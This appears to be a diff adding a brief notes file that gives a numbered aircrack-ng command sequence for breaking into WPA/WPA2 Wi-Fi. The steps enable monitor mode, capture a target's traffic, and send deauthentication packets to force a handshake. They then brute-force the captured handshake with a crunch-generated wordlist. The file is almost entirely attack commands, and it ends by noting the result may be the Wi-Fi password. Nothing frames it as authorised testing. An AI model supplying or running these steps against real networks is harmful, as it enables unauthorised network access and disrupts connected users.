@@ -1,0 +1,20 @@
+1. airmon-ng
+2. airmon-ng start wlan0 	// start wlan
+3. airodump-ng wlan0mon		// list of wifi
+4. airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface]
+5. aireplay-ng –0 2 –a [router bssid] –c [client bssid] mon0	
+   // Deauth, 2 is number of packets send
+6. After handshake stop process and then
+7. aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
+
+
+
+
+11. airmon-ng stop wlan0mon
+    service network-manager restart
+
+12. crunch <min-length> <max-length> [<charset strings>] [options]
+    -o /root/wlist.txt  
+
+this will capture the handshake of wpa/wpa2 and by brute force you
+may get the wifi password
